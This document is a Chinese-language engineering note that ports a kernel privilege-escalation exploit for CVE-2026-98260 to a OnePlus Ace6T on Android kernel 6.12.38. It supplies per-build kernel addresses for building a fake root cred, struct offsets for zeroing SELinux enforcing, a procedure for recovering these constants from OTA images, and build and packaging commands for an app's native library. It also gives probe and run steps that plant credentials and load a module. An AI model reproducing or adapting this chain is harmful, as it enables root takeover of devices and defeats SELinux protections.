# PLR110 6.12.38 CVE-2026-98260 适配（新增 profile）

与 `rust-t61269` 同源、同一物理链路，只有 per-build 常量不同。
**不改动 6.12.69 / 6.18.21 / V2505A 既有入口**，新增一个编译期分支和一个独立 `.so`。

## 状态

常量已从 OTA `boot.img` 的内核 Image 静态恢复，并用镜像自带的 `.BTF` 交叉校验了
slab 与结构体布局。**尚需真机验证**：先跑只读 `probe`，再跑完整 `run`。

## 复核记录

2026-11-09 用下列 OTA 镜像复核，`recover.py` 输出与本文件常量完全一致：

- `boot.img`：100,663,296 字节，SHA-256 `fe716ab08e683cf0ba0e56ae3f22434435268b738158166d9d8474d4ebc89937`
- 内核 Image：40,024,576 字节（`boot.img[0x1000:]`），SHA-256 `e2efc9dcae2d180e22c85b5d760776b232178dfa758784cf94df3bc2df39147f`
- kallsyms：`n=126252`、`names 0x141c010..0x1605592`、`offsets 0x16062d8`、`relative_base 0xffffffc080000000`、0 逆序
- `do_timer_create=0xffffffc0801e23dc`，BL `+0xa8`，site `0xffffffc0801e2488`（low21 `0x1e2488`）
- `dup_task_struct=0xffffffc0800d1544`（本镜像未内联进 `copy_process`），BL `+0x50`，site `0xffffffc0800d1598`（low21 `0x0d1598`）
- 六个静态地址见常量块；BTF 布局见下表

## 目标

- 机型：OnePlus Ace6T（PLR110），ColorOS 17
- 内核：`6.12.38-android16-5-g844001fb8721-ab14552068-4k`
- 注意：这是 **android16-5** KMI；现有 6.12.69 链是 android16-6。SUSFS 与 Dynamic Switching 复用现有 6.12 资产，需在真机确认。

## 常量

```c
#define TARGET_KERNEL_RELEASE      "6.12.38-android16-5-g844001fb8721-ab14552068-4k"

/* do_timer_create = 0xffffffc0801e23dc，bl kmem_cache_alloc_noprof @ +0xa8 */
#define STATIC_TIMER_SITE          0xffffffc0801e2488ULL   /* 返回地址 +0xac */
#define TIMER_SITE_LOW21           0x1e2488ULL

/* kallsyms 链接期地址 */
#define SELINUX_STATE_STATIC       0xffffffc0826894d0ULL   /* enforcing @ +0x0 */
#define PANIC_ON_WARN_STATIC       0xffffffc0823fafe0ULL

/* 本镜像未内联 dup_task_struct：
 * dup_task_struct = 0xffffffc0800d1544，bl kmem_cache_alloc_node_noprof @ +0x50
 * 返回地址 +0x54，即 0xffffffc0800d1598。宏名沿用 COPY_PROCESS_LOW21。 */
#define COPY_PROCESS_LOW21         0x0d1598ULL

/* fake cred 引用计数子对象 */
#define ROOT_USER_STATIC           0xffffffc0824217a0ULL
#define INIT_USER_NS_STATIC        0xffffffc082421528ULL
#define INIT_UCOUNTS_STATIC        0xffffffc082423138ULL
#define INIT_GROUPS_STATIC         0xffffffc082422c68ULL
```

结构布局（BTF 实测，与 6.12.69 一致，代码里无需改动）：

| 对象 | 值 |
| --- | --- |
| `struct k_itimer` | 0x100，`it`（rb node）@ 0x78 |
| `struct cred` | 0xb8，uid/gid @ 0x8，euid @ 0x18，caps 0x30–0x50，security @ 0x80 |
| `struct task_struct` | 0x1440，`cred` @ 0x900 |
| `struct selinux_state` | 0x80，`enforcing` @ 0x0（故 `state - 7` 的 8 字节零写可清掉它）|
| `struct task_security_struct` | 0x18，exec_sid @ 0x8，create_sid @ 0xc |

## 恢复方法（可复现）

镜像本身是裸 arm64 Image（40,024,576 字节，boot header v4、无 ramdisk、kernel 偏移 0x1000）。
下面的常量由 `recover.py` 从同一份 Image 自动重算；脚本会同时扫描 `copy_process`
和 `dup_task_struct`：

```bash
python3 recover.py kernel.bin      # kernel.bin = boot.img[0x1000 : 0x1000+kernel_size]
```

1. **取 release**：全文搜 `6.12.\d+-\w+` 得到 `linux_banner`。
2. **kallsyms**：names 是 token 压缩格式，脚本按结构定位各表，并回报
   `n=126252`、`names 0x141c010..0x1605592`、`offsets 0x16062d8`、
   `relative_base 0xffffffc080000000`、0 个逆序。
3. **.BTF**：用镜像自带 BTF 出结构体偏移，确认与 6.12.69 的
   `k_itimer/cred/task_struct/selinux_state/task_security_struct` 布局一致。
4. **调用点**：按符号表反汇编，扫 `BL` 到 `kmem_cache_alloc_noprof` /
   `kmem_cache_alloc_node_noprof`。`do_timer_create` 的 BL 在 `+0xa8`
   （site `+0xac`）；`dup_task_struct` 的 BL 在 `+0x50`（site `+0x54`）。
   ftrace 记录的是返回地址（`_RET_IP_`），所以 site = BL 地址 + 4。
5. `copy_process` 本身没有 BL 命中是正常的：这个镜像没有把 `dup_task_struct`
   内联进去。`recover.py` 会单独打印 `dup_task_struct` 的两处分配点，第一处
   （low21 `0xd1598`）是 task_struct，第二处是线程栈缓存，不采用。

> 若真机 `PROBE_TIMER recs=0`，说明走的是另一个 `posix_timers_cache` 分配点：
> 把 `STATIC_TIMER_SITE` 换成 `0xffffffc0801e2958`、`TIMER_SITE_LOW21` 换成 `0x1e2958` 再试。

## 构建

```bash
cd exploit/rust-t61269
cargo build --release --target aarch64-linux-android --features plr110_61238
# 产物复制为 App 原生库名（与既有入口同样的处理方式）
cp target/aarch64-linux-android/release/t61269 \
   ../../app/app/src/main/jniLibs/arm64-v8a/libt61238.so
```

`build.rs` 会为这个 feature 追加 `-DKERNEL_61238`，`Cargo.toml` 对应
`plr110_61238 = []`。

## App 侧

- `ExploitKind.CVE61238("CVE-2026-98260-6.12.38")`，按 `uname -r` 含 `6.12.38` 自动选中
- 入口：`nativeLibraryDir/libt61238.so run`
- SUSFS 走 `libsusfs_guard_lkm_612.so`；Dynamic Switching 与其它 6.12 入口一致；VFS 不开放

## 验证顺序

1. 只读自检（不 race、不回收、不写内核）：
   `libt61238.so probe` → 期望 `PROBE_KERNEL`、`PROBE_TIMER ... low21=0x1e2488`、
   `PROBE_TASK ... expected_low21=0xd1598`、`PROBE_SLIDE ... aligned=1`、
   `PROBE_LINEAR_MAP`、`PROBE_CRED`、`PROBE_OK`
2. 完整链路：`libt61238.so run`，关注 `PLANT_CRED_OK` / `PARKED=1` / `MODULE_LOADED`
3. 冷重启后再跑一次；再验 SUSFS 与 Dynamic Switching
4. 失败一律留 holder（`t61269-hold`），**同 boot 不要强行重跑**，冷重启再试

竞态 UAF 本身可能导致 panic/重启；仅用于自有设备。
